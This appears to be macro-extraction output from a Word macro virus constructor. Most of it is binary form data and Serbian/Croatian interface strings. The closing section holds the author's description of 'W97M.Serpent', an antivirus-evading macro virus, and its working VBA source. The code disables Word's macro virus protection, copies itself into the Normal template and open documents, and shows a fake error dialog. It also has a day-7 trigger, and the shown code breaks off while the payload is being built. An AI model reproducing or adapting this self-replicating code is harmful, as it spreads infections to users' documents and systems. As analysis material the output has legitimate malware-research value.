- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����]_'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g4W^G�)���m�Ӛ�;�����|o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ﷳ��������,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a\��%�b�Uz��t�
2��(��mh�>�1X��-�9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�~N��޻m]��^�z6�վ
\ds'.Cb�U?KԌ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɻN�^Mn5r��6��m��{�������R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��ȴ���5^�#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���iL���xw�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�d�P�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8ӳtSq����i
�}��c�瘧�z\��jZ��<��Ҧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�n}�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8���]����ju�mp�z�KIi���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
26�)Ӳe��y���~,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\yo��w��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-�gW��'y����mw�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǔ�Ô�Eu�ף&sR�RkXm��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��5{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�͸�5ǎ��a��&�W�Ƕ�1�8l|�k�,7��\���Ȅ�T�o[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;m1>��A^w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J^'���K[���L����ﭷ��ܗ/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<|L,�OY;=+�շ��z�CjRt�G�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=m����Ow��{��eS���F%Z��EQuy4ʫgO��(�(�=Z[���Y�:Ϧ]������u�:Yi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}iܷW��x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��Ɩ�_��~#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\���Zb9r�k����Ě����y�3�	�^p~�_��������r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�0I���F1Vb;S��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|������_�Lu��H�EKo��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\���kv>L���G���}�㒴�F���W��s�9�M�q�X��pr���J׽jm��^�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�⬣E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u���}e�E��u��u'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8X6D[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6:��ޛ���x�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�޿�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�}����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�M?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E��ƅWJ�n�s�,sZ(�ۯ�H�O�N�W��\z�p�Lw�\5œ��5�d�2['v�ٗ��T�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�Ll�t���i��j�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cY�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H�o7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U^=�-A��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f&f2��9�|�����œ�����[�ؾ����8L�12/���g�uq�7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��v{�_(�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K���l9i��M�O��|5�̃���[U�,���$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���IIi� �v�?/u�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$e��;nɏ%:��^��Ǯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��ro���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��EQ����Y�+O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tyo�b�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�d�L���~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d������k�xy����>��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9	Q{�D�EUΩ�l��#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A]����zNw�9SK��c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<v���{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��ڹG!�aO�ŧ'բ�����P�V�Tc�Z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u��q&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�<y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˶���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��S��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���̔
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��гX�RIh�➦k�u�ك��8zx�Zb�5�n�W'sv[^��/U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Xy�x�a��
5N�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���iyX�9�;u��_9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1q�ڱZ[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\^,�moR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Z�\�F���7Kr������zDRmX�F�e����_,r+X�;������>C���1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�Y*m��'O��Q�3z�᭫6�f=�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����<yi{u����,�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӹ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����l��4���5m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}�G9>6y�|z����X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�1��G�%Ǯ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
٢pi�ew��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�N�rw�/�����Y����m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qU�i�O�b�1mb5�up�q�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�7z�ɺ�9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���!-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3����C<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�M?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cd�QD)�7�k�X�����^޺�֖�}+^G�q���b0�ɋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1t�c���Ϳĭ��g��)�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�7cQ����*!=^�c)k���Ej/�}�X��<�Z�/LX7N/��'{fZ^���<5�2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y�Փ�Ӟ>S����4���5�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��y<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L���/~ַ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/z}~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ሯ��Ό��e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T[�����c�mu����8�b�ұl|�sl8�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�V�;�7e�}T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�޿�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�}������'�M?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��K�ǖ"u8,�.���R��}=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/���^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Y���t���m��y�'��H�D�%OߍX�Q�_���11sw�\\�.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��=n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]r|�Z�Z[w=�g^��������z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<< S - t - a - r - T >>.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: BETA  VERZIJA ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: BETA  VERZIJA ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zelite napustiti program?ɳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/userexit/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W97M.Serpent by e[ax]                                                                                                                             Macro virus koji koristi OIE v1.0 [ Object Infection Engine ]. OIE v1.0 sam uradio licno ja. Do ovog momenta, sada kada pisem, nije detektovan ni od jednog AV alata.  EPL�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/w97m_serpent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Dim KIOXCFG, SDFHITD, GHJIDFR, LKJWERT: Set LKJWERT = ActiveDocument.VBProject.VBComponents(1).CodeModule: Const nula = 2 * 0
With Options: .VirusProtection = nula: End With
Set KIOXCFG = ThisDocument.VBProject.VBComponents(1).CodeModule
Set SDFHITD = NormalTemplate.VBProject.VBComponents(1).CodeModule
GHJIDFR = KIOXCFG.lines(1, KIOXCFG.countoflines)
If SDFHITD.countoflines = KIOXCFG.countoflines Then
MsgBox "Error245! MSWord will try to fix the problem.", vbCritical, "MSWord - error"
End If
Dim QOINMV As New DataObject: QOINMV.SetText GHJIDFR
With SDFHITD: .deletelines 1, SDFHITD.countoflines: .insertlines 1, QOINMV.GetText
End With: With LKJWERT: .deletelines 1, LKJWERT.countoflines: .insertlines 1, QOINMV.GetText
End With
If Day(Now()) = 7 Then
Dim asd As String
For l = 1 To 4
asd = Chr(Rnd * 34 + 123) & ChrW(Rnd * 100 + 23)
asd = asd & Chr(Rnd * 200 - 10): dsa = asd & Hex(234 * Rnd) & Chr(Rnd * 5 + 55)
dfg = dsa & Hex(54) & asd & dsa: h = Asc(Chr(Rnd * 123)): x = asd & dfg & dsa & h & x
Next l
